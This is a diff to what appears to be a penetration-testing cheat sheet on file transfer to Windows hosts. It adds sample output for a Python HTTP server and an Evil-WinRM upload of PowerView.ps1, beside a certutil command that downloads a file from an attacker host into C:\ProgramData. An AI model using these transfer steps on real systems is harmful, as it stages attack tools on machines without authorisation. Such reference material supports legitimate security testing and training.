@@ -15,6 +15,11 @@ tags: ["Curl", "Http File Transfer", "File Transfer", "Windows", "Evil-Winrm", "
 python3 -m http.server <LOCAL_PORT>
 ```
 
+```console {class=sample-code}
+$ python3 -m http.server 8443
+Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
+```
+
 <br>
 
 ```console
@@ -73,6 +78,16 @@ certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramDat
 ```console
 # Evil-winrm built-in function
 upload '<LOCAL_FILE_PATH>' "C:\ProgramData\<FILE>"
+```
+
+```console {class=sample-code}
+*Evil-WinRM* PS C:\programdata> upload /home/kali/PowerView.ps1 C:\ProgramData\PowerView.ps1
+                                        
+Info: Uploading /home/kali/PowerView.ps1 to C:\ProgramData\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
 ```
 
 {{< /tabcontent >}}
